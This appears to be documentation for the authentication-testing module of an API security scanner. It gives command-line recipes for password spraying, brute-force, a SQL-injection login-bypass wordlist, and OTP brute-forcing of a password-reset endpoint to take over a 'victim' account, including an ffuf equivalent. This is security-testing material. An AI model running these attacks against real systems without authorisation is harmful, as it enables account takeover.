# Authentication Testing (API2)

The Authentication Testing Module detects **OWASP API2 - Broken Authentication**: weak JWT handling, anonymous access to protected data, missing token invalidation, and — with the advanced probes — missing anti-automation controls such as account lockout and rate limiting.

Run it in isolation with `apileaks owasp auth --target URL` (recommended for focused testing) or as part of an orchestrated `scan`. This page documents the authentication-specific options, with a focus on the **login attack probes**: password spraying, password brute-force, credential transport modes, response-based success detection, and single-endpoint testing.

> **Note:** `full` and `main` are deprecated, hidden aliases of `scan`. `full --modules auth` is now `apileaks owasp auth`.

## 📋 Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Login Attack Probes](#login-attack-probes)
  - [Enabling the probes (`--allow-aggressive-auth`)](#enabling-the-probes)
  - [Single-endpoint testing (`--no-discovery`)](#single-endpoint-testing)
  - [Explicit login endpoint (`--login-endpoint`)](#explicit-login-endpoint)
  - [Credential transport (`--login-send-mode` / `--login-method`)](#credential-transport)
  - [Field names (`--login-username-field` / `--login-password-field`)](#field-names)
  - [Password spraying (`--spray-password` / `--users-wordlist`)](#password-spraying)
  - [Password brute-force (`--brute-username` / `--passwords-wordlist`)](#password-brute-force)
  - [SQL-injection auth bypass](#sql-injection-auth-bypass)
  - [Success detection (`--success-match` / `--failure-match` / `--success-status`)](#success-detection)
- [OTP / MFA Brute-Force](#otp--mfa-brute-force)
  - [OTP endpoint and code space](#otp-endpoint-and-code-space)
  - [Extra body fields (`--otp-extra-field`)](#extra-body-fields)
  - [OTP success detection (`--otp-filter-size` / match)](#otp-success-detection)
  - [Exhaustive enumeration (`--otp-exhaustive`)](#exhaustive-enumeration)
  - [Replacing an `ffuf` OTP attack](#replacing-an-ffuf-otp-attack)
- [Hiding HTTP status codes (`--hide-status` / `--hide-errors`)](#hiding-http-status-codes)
- [Full Option Reference](#full-option-reference)
- [Finding Categories](#finding-categories)
- [Remediation](#remediation)

## 🎯 Overview

The default (non-aggressive) run performs read-only checks: anonymous-access comparison, JWT analysis, token-expiration and logout-invalidation tests. The **login attack probes** (spraying, brute-force, rate-limit and IP-bypass checks) are gated behind `--allow-aggressive-auth` and are skipped under `--safe-mode`.

Two complementary credential attacks are supported:

| Probe | Pattern | Flags | Evades |
|-------|---------|-------|--------|
| Password spraying | 1 password × N users | `--spray-password` + `--users-wordlist` | Per-account lockout |
| Password brute-force | 1 user × N passwords | `--brute-username` + `--passwords-wordlist` | Weak/absent lockout |

Both honour the same credential transport (`--login-send-mode`, `--login-method`), field names, and success-detection rules described below.

## 🚀 Quick Start

```bash
# Default read-only auth checks
python apileaks.py owasp auth --target https://api.example.com

# Password spraying against a single known login endpoint
python apileaks.py owasp auth \
  --target https://api.example.com/login \
  --no-discovery \
  --allow-aggressive-auth \
  --users-wordlist users.txt \
  --spray-password 'Spring2024!'

# Password brute-force (1 user × many passwords)
python apileaks.py owasp auth \
  --target https://api.example.com/login \
  --no-discovery \
  --allow-aggressive-auth \
  --brute-username admin \
  --passwords-wordlist passwords.txt
```

## Login Attack Probes

### Enabling the probes

**`--allow-aggressive-auth`** — Opt-in flag required for all active login attacks (spraying, brute-force, rate-limit, IP-header bypass, timing oracle). Without it, these probes are skipped. They are also skipped under `--safe-mode`.

```bash
python apileaks.py owasp auth --target https://api.example.com/login --allow-aggressive-auth ...
```

### Single-endpoint testing

**`--no-discovery`** — Skips endpoint/directory discovery and tests **only** the target URL. Use it when you already know the login endpoint and do not want the tool fuzzing dozens of paths (`/admin`, `/login`, ...) first.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/v1/users.php' \
  --no-discovery \
  --allow-aggressive-auth \
  --brute-username admin \
  --passwords-wordlist passwords.txt
```

Without this flag the module runs its normal discovery phase and auto-detects login endpoints only when they match built-in patterns (`/login`, `/signin`, `/token`, ...) **and** are POST/PUT. Routes like `/v1/users.php` are not auto-detected — use `--login-endpoint` (below) or `--no-discovery`.

### Explicit login endpoint

**`--login-endpoint URL`** — Forces the spray/brute-force probes to target this exact URL, bypassing auto-detection. Required when the login route does not match the built-in login patterns.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --allow-aggressive-auth \
  --login-endpoint 'https://api.example.com/v1/users.php?format=json' \
  --users-wordlist users.txt \
  --spray-password 'Password123'
```

Any pre-existing query parameters in the URL (such as `format=json`) are preserved; only the credential fields are added/overridden.

### Credential transport

**`--login-send-mode [json|form|query|xml]`** — How credentials are transmitted. Default is `json`.

| Mode | Transport | Content-Type |
|------|-----------|--------------|
| `json` | JSON body `{"username": ..., "password": ...}` | `application/json` |
| `form` | URL-encoded body | `application/x-www-form-urlencoded` |
| `query` | Appended to the URL query string | n/a (for GET-style APIs) |
| `xml` | XML body `<login><username>..</username>..</login>` | `application/xml` |

**`--login-method [GET|POST|PUT]`** — HTTP method for login requests. Default is `POST`. Independent of the send mode, so any combination works (e.g. `POST` + `query`, or `GET` + `query`).

```bash
# GET-style PHP API: credentials in the query string
python apileaks.py owasp auth \
  --target 'https://api.example.com/v1/users.php' \
  --no-discovery --allow-aggressive-auth \
  --login-endpoint 'https://api.example.com/v1/users.php?format=json' \
  --login-send-mode query \
  --login-method GET \
  --brute-username test \
  --passwords-wordlist passwords.txt

# JSON API over POST (the default transport)
python apileaks.py owasp auth \
  --target 'https://api.example.com/api/v1/login' \
  --no-discovery --allow-aggressive-auth \
  --login-send-mode json \
  --login-method POST \
  --users-wordlist users.txt \
  --spray-password 'Welcome1'

# XML SOAP-style login
python apileaks.py owasp auth \
  --target 'https://api.example.com/auth' \
  --no-discovery --allow-aggressive-auth \
  --login-send-mode xml --login-method POST \
  --brute-username svc_account \
  --passwords-wordlist passwords.txt
```

### Field names

**`--login-username-field FIELD`** / **`--login-password-field FIELD`** — The parameter/body field names for the username and password. Defaults are `username` and `password`. Applies to all send modes.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --login-username-field email \
  --login-password-field pass \
  --users-wordlist users.txt --spray-password 'Hunter2'
```

### Password spraying

One fixed password tried across many usernames — designed to stay under per-account lockout thresholds (each account receives a single attempt).

- **`--spray-password PASSWORD`** — the single password to spray.
- **`--users-wordlist PATH`** — newline-separated usernames/emails (one per line, `#` comments allowed).
- **`--spray-batch-size N`** — max usernames per run (default 50).

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --users-wordlist users.txt \
  --spray-password 'Spring2024!' \
  --spray-batch-size 100
```

### Password brute-force

The inverse of spraying: one fixed username against many candidate passwords — surfaces missing lockout and rate limiting.

- **`--brute-username USERNAME`** — the fixed account to attack.
- **`--passwords-wordlist PATH`** — newline-separated candidate passwords (one per line, `#` comments allowed).
- **`--brute-batch-size N`** — max passwords per run (default 100).

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --brute-username admin \
  --passwords-wordlist rockyou-top1000.txt \
  --brute-batch-size 500
```

### SQL-injection auth bypass

Because `--passwords-wordlist` accepts any string per line, you can feed it a SQLi auth-bypass wordlist and detect login bypass by response content. Pair it with [success detection](#success-detection).

`sqli-auth-bypass.txt`:

```text
' OR '1'='1
' OR 1=1--
admin'--
" OR ""="
' OR '1'='1' --
```

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/v1/users.php' \
  --no-discovery --allow-aggressive-auth \
  --login-endpoint 'https://api.example.com/v1/users.php?format=json' \
  --login-send-mode query --login-method GET \
  --brute-username test \
  --passwords-wordlist sqli-auth-bypass.txt \
  --failure-match 'Invalid|incorrect|denied|false'
```

> This detects authentication bypass via response differences. It is **not** a full SQLi scanner (no error/time/boolean-based detection).

### Success detection

By default an attempt counts as success only on a **2xx** status. Many APIs return `200` for both valid and invalid logins (common with PHP APIs) and signal the result in the body. These flags classify success from the response instead:

- **`--success-match REGEX`** — a match in the response body marks SUCCESS (e.g. `'"token"'`, `'welcome'`, `'"success"\s*:\s*true'`).
- **`--failure-match REGEX`** — the ABSENCE of the regex marks SUCCESS (the regex is the known failure marker, e.g. `'Invalid credentials'`).
- **`--success-status CODES`** — comma-separated status codes that count as success (e.g. `'200,302'`).

Precedence: `--success-match` → `--failure-match` → `--success-status` → default 2xx. Regex matching is case-insensitive.

```bash
# Success when the body contains a JWT token
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --brute-username admin --passwords-wordlist passwords.txt \
  --success-match '"token"'

# Success when the failure marker is absent (API returns 200 either way)
python apileaks.py owasp auth \
  --target 'https://api.example.com/v1/users.php' \
  --no-discovery --allow-aggressive-auth \
  --login-endpoint 'https://api.example.com/v1/users.php?format=json' \
  --login-send-mode query --login-method GET \
  --brute-username test --passwords-wordlist passwords.txt \
  --failure-match 'Invalid|incorrect'

# Success on a 302 redirect to a dashboard
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --users-wordlist users.txt --spray-password 'Welcome1' \
  --success-status '200,302'
```

## OTP / MFA Brute-Force

The OTP probe sequentially enumerates numeric one-time-password codes against an OTP verification or password-reset endpoint. It detects missing rate limiting / lockout and can recover a valid code when the endpoint is unprotected. It is gated by `--allow-aggressive-auth` and skipped under `--safe-mode`.

### OTP endpoint and code space

- **`--otp-endpoint URL`** — the OTP verification / reset endpoint (POST, JSON body).
- **`--otp-digits N`** — number of digits in the code (4 or 6 are common). Default 6.
- **`--otp-field FIELD`** — JSON field carrying the code. Default `otp`.
- **`--otp-session-token TOKEN`** / **`--otp-session-field FIELD`** — provisional/session token sent alongside the code, when the flow uses one. Optional if `--otp-extra-field` is supplied instead.

```bash
# Classic OTP verify flow with a provisional session token
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
  --otp-digits 6 --otp-field code \
  --otp-session-field session_token \
  --otp-session-token 'prov_abc123'
```

### Extra body fields

**`--otp-extra-field KEY=VALUE`** (repeatable) — merges additional fixed fields into the OTP request body. Needed for password-reset flows that carry more than the code, e.g. an email and a new password. When extra fields are supplied, `--otp-session-token` is not required.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'https://api.example.com/api/v1/authentication/customers/passwords/resets' \
  --otp-digits 4 --otp-field OTP \
  --otp-extra-field 'Email=victim@example.com' \
  --otp-extra-field 'NewPassword=Pwned123!'
```

The request body sent for each candidate code `0000`..`9999` becomes:

```json
{"OTP": "0000", "Email": "victim@example.com", "NewPassword": "Pwned123!"}
```

### OTP success detection

By default a code is accepted on a 2xx status. Most OTP endpoints return 200 for both wrong and right codes, so use one of these (precedence: match → filter-size → 2xx):

- **`--otp-success-match REGEX`** — a body match marks the code as correct (e.g. `'reset successful'`, `'"status"\s*:\s*"ok"'`).
- **`--otp-failure-match REGEX`** — the ABSENCE of the regex marks success (the regex is the known failure marker, e.g. `'Invalid OTP'`).
- **`--otp-filter-size N`** — the response byte size of a FAILED attempt (the direct equivalent of `ffuf -fs`). Any other size is treated as a hit.

```bash
# Success when the wrong-code response is always 23 bytes (ffuf -fs 23)
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
  --otp-digits 4 --otp-field OTP \
  --otp-extra-field 'Email=victim@example.com' \
  --otp-filter-size 23

# Success by body marker instead of size
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
  --otp-digits 4 --otp-field OTP \
  --otp-session-token prov_abc \
  --otp-failure-match 'Invalid|expired'
```

### Exhaustive enumeration

By default the probe stops at `--auth-rate-limit-attempts` (default 10) — enough to prove missing rate limiting without hammering the endpoint. To actually crack an unprotected OTP, enumerate the full space:

- **`--otp-exhaustive`** — iterate all `10**digits` codes (10,000 for 4 digits, 1,000,000 for 6). The probe still stops early on the first 429/lockout or on a hit.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'https://api.example.com/api/v1/auth/otp/verify' \
  --otp-digits 4 --otp-field OTP \
  --otp-extra-field 'Email=victim@example.com' \
  --otp-filter-size 23 \
  --otp-exhaustive
```

> Combine with `--rate-limit` to control request pace. The OTP probe is sequential by design (so it can observe lockout accurately); there is no per-request concurrency flag.

### Replacing an `ffuf` OTP attack

A typical `ffuf` OTP brute-force:

```bash
ffuf -w otp-4digit.txt:OTPA \
  -u 'http://host/api/v1/authentication/customers/passwords/resets' \
  -X POST -H 'Content-Type: application/json' \
  -d '{"Email":"victim@example.com","OTP":"OTPA","NewPassword":"123456"}' \
  -fs 23 -t 10
```

Equivalent in APILeak:

```bash
python apileaks.py owasp auth \
  --target 'http://host' \
  --no-discovery --allow-aggressive-auth \
  --otp-endpoint 'http://host/api/v1/authentication/customers/passwords/resets' \
  --otp-digits 4 --otp-field OTP \
  --otp-extra-field 'Email=victim@example.com' \
  --otp-extra-field 'NewPassword=123456' \
  --otp-filter-size 23 \
  --otp-exhaustive \
  --hide-errors
```

| `ffuf` | APILeak |
|--------|---------|
| `-w otp-4digit.txt:OTPA` + `"OTP":"OTPA"` | `--otp-digits 4 --otp-field OTP` (auto-generates 0000–9999) |
| `Email` / `NewPassword` in `-d` | `--otp-extra-field 'Email=...'` / `--otp-extra-field 'NewPassword=...'` |
| `-fs 23` | `--otp-filter-size 23` |
| full wordlist | `--otp-exhaustive` |
| `-t 10` | no direct equivalent (sequential); pace with `--rate-limit` |

## Hiding HTTP status codes

The colored HTTP request log prints every request. These display-only filters suppress noise without affecting findings:

- **`--hide-errors`** — hide all 4xx and 5xx requests (shortcut for `--hide-status 4xx,5xx`).
- **`--hide-status CODES`** — hide specific codes, ranges, or class tokens, e.g. `400,404`, `4xx,5xx`, `400-404`.

There is also the inverse allowlist `--status-code CODES` (scan command) to show only matching codes.

```bash
python apileaks.py owasp auth \
  --target 'https://api.example.com/login' \
  --no-discovery --allow-aggressive-auth \
  --brute-username admin --passwords-wordlist passwords.txt \
  --failure-match 'Invalid' \
  --hide-errors
```

## Full Option Reference

| Option | Default | Description |
|--------|---------|-------------|
| `--allow-aggressive-auth` | off | Enable active login attack probes. Skipped under `--safe-mode`. |
| `--no-discovery` | off | Skip discovery; test only the target URL. |
| `--login-endpoint URL` | auto-detect | Explicit login endpoint for spray/brute-force. |
| `--login-send-mode MODE` | `json` | Credential transport: `json`, `form`, `query`, `xml`. |
| `--login-method METHOD` | `POST` | HTTP method: `GET`, `POST`, `PUT`. |
| `--login-username-field FIELD` | `username` | Username field name. |
| `--login-password-field FIELD` | `password` | Password field name. |
| `--spray-password PASSWORD` | — | Single password to spray across users. |
| `--users-wordlist PATH` | — | Username/email wordlist for spraying. |
| `--spray-batch-size N` | 50 | Max usernames per spray run. |
| `--brute-username USERNAME` | — | Fixed username for brute-force. |
| `--passwords-wordlist PATH` | — | Password (or SQLi payload) wordlist. |
| `--brute-batch-size N` | 100 | Max passwords per brute-force run. |
| `--success-match REGEX` | — | Body regex marking success. |
| `--failure-match REGEX` | — | Body regex whose absence marks success. |
| `--success-status CODES` | 2xx | Status codes counting as success. |
| `--otp-endpoint URL` | — | OTP verification / reset endpoint. |
| `--otp-digits N` | 6 | Number of digits in the OTP code. |
| `--otp-field FIELD` | `otp` | JSON field carrying the code. |
| `--otp-session-token TOKEN` | — | Provisional/session token (optional with extra fields). |
| `--otp-session-field FIELD` | `session_token` | Session token field name. |
| `--otp-extra-field KEY=VALUE` | — | Extra fixed body field (repeatable). |
| `--otp-success-match REGEX` | — | Body regex marking a correct OTP. |
| `--otp-failure-match REGEX` | — | Body regex whose absence marks a correct OTP. |
| `--otp-filter-size N` | — | Failure response size (ffuf `-fs`); other sizes = hit. |
| `--otp-exhaustive` | off | Enumerate the full `10**digits` space. |
| `--hide-status CODES` | — | Hide status codes/classes from the request log. |
| `--hide-errors` | off | Hide all 4xx/5xx from the request log. |

## Finding Categories

| Category | Severity | Meaning |
|----------|----------|---------|
| `AUTH_PASSWORD_SPRAY_VALID_CREDENTIAL` | CRITICAL | A sprayed password was accepted for some username. |
| `AUTH_PASSWORD_SPRAY_NO_DETECTION` | HIGH | Full spray completed with no rate limit / anomaly detection. |
| `AUTH_PASSWORD_BRUTE_FORCE_VALID_CREDENTIAL` | CRITICAL | A password (or SQLi payload) was accepted for the username. |
| `AUTH_PASSWORD_BRUTE_FORCE_NO_LOCKOUT` | HIGH | Full brute-force completed with no lockout / rate limit. |
| `AUTH_OTP_BRUTEFORCE_SUCCESS` | CRITICAL | An OTP code was accepted after enumeration. |
| `AUTH_OTP_NO_RATE_LIMITING` | HIGH | OTP endpoint did not throttle/lock after repeated attempts. |

## Remediation

- Enforce **account lockout** or exponential backoff after a small number of failed attempts.
- Add **global rate limiting** keyed on the originating IP (not only per-account) to blunt spraying.
- Require **MFA** and strong password policies.
- Return a **single generic error** (same body and status) for all failed logins to defeat response-based oracles.
- Use **parameterized queries** to eliminate SQL-injection authentication bypass.
